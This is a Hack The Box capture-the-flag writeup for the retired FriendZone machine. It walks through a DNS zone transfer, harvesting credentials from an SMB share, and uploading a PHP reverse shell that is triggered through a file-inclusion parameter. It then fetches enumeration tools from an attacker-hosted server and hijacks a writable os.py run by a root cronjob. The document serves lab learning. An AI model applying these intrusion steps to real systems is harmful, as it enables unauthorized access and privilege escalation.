---
title: FriendZone Hackthebox Writeup
date: 2021-02-03 07:00:00 +0530
categories: [Hackthebox, Retired]
tags: [linux,cronjob,smb,os hijacking]     # TAG names should always be lowercase
image: /assets/img/friendzone-hackthebox/friendzone-pic.png
subtitle: JHBDOcubeoveiubo
---


# Introduction@FriendZone:~$


Column | Details
------------ | -------------
Name | FriendZone
IP | 10.10.10.123
Points | 20
Os | Linux
Difficult | Low
Creator | [askar](https://www.hackthebox.eu/home/users/profile/17292)
Out on | 9th February 2019

# Summary:~$

* Discovering the new host and scanning for open ports.
* Zone transfering with 2 hostnames found in `nmap scan` and `source code`.
* Getting `Admin` credentials by accessing `smb` to login into a login page.
* Uploading `reverse shell` via smb and accessing it from the browser.
* Hijacking `os.py` to get root shell.

# Starting:~$

## Nmap

I have used **nmapAutomator** , which keeps the scanning fast and reduces effort.*(Not recommended in real life scenarios).* 

Dowload link: [nmapAutomator](https://github.com/21y4d/nmapAutomator)

___
![](/assets/img/friendzone-hackthebox/nmap-scan-1.png)

Accessing `Port 80`.

___
![](/assets/img/friendzone-hackthebox/port-80.png)

Let's use `gobuster` on the url to find hidden directories.

**Command**: *gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://friendzone.htb/ -t 100*

___
![](/assets/img/friendzone-hackthebox/gobuster-4.png)

I accessed `/wordpress` directory, but it's empty

After that I checked the `source code` and found a hostname: *friendzone.red* and another from `nmap scan`, hostname: *friendzoneportal.red*.

As `port 53` is also open, let's do a `zone transfer`.

**Command**: *host -l domain-name dns_server-address*

*host -l friendzone.red 10.10.10.123 > zonetransfer.txt*

*host -l friendzoneportal.red 10.10.10.123 >> zonetransfer.txt*

___
![](/assets/img/friendzone-hackthebox/zone-transfer-command-5.png)

Adding all of the domain names to `/etc/hosts`, accessing them simultaneously I found this:

**URL**: *https://administrator1.friendzone.red/*

___
![](/assets/img/friendzone-hackthebox/new-admin-page-10.png)

But we don't know the username and the password, let's look in other ports too.

Checking `port 139` i.e. SMB using smbclient.

**Command**: *smbclient -L ////10.10.10.123//*

___
![](/assets/img/friendzone-hackthebox/smbclient-6.png)

I found the `credentials` in **general** using smbclient.

**Command**: *smbclient //10.10.10.123/general*

`admin`:`WORKWORKHhallelujah@#`

After loging in, I got this:

___
![](/assets/img/friendzone-hackthebox/new-login-11.png)

Let's access `/dashboard.php`.

___
![](/assets/img/friendzone-hackthebox/loggging-in-image-12.png)

Access *https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp*

___
![](/assets/img/friendzone-hackthebox/parameter-13.png)

Now we can see that timestamp is visible on the screen.

Let's put a [php shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) using `smb` in *Development* and try to access it from the browser.

___
![](/assets/img/friendzone-hackthebox/put-shell-php-14.png)

After alot of retries I finally got a reverse shell as `www` by accessing this URL: *https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/exploit*  (**.php extension is automatically attached with it**)

___
![](/assets/img/friendzone-hackthebox/got-www-shell-15.png)

Got the `User flag`.

Now for `Privilege Escalation`, I had sent [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) and [pspy32s](https://github.com/DominicBreuker/pspy/blob/master/README.md) on the victim machine.

**Command**: *wget http://10.10.X.X:8081/linpeas.sh* (or pspy32s)
**Hosting Command**: *python3 -m http.server 8081*

___
![](/assets/img/friendzone-hackthebox/sending-pspy-linpeas-16.png)

I ran `linpeas.sh` by giving it executing permssions *chmod +x linpeas.sh* but couldn't find any thing interesting.

After that I ran `pspy32s` by giving it executing permissions *chmod +x pspy32s*, and found a cronjob running.

___
![](/assets/img/friendzone-hackthebox/reporter-cronjob-17.png)

Let's check the permssions for `reporter.py`.

___
![](/assets/img/friendzone-hackthebox/read-permission-reporter-18.png)

We only have read permissions on it. Reading the file.

___
![](/assets/img/friendzone-hackthebox/cat-reporter-19.png)

Let's try to check the permissions of `os.py` and if it could be hijacked.

___
![](/assets/img/friendzone-hackthebox/os-permissions-21.png)

We have `write permissions` on it, so what I did was downloaded the file i.e. `os.py` via `smb` (*similarly we downloaded creds.txt*), added my [reverse shell payload](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and sent it back via `smb` (*similarly we uploaded exploit.php*)

Listening on the specified port using `nc` and waiting for the cronjob to run. We got `Root`.

___
![](/assets/img/friendzone-hackthebox/got-root-23.png)
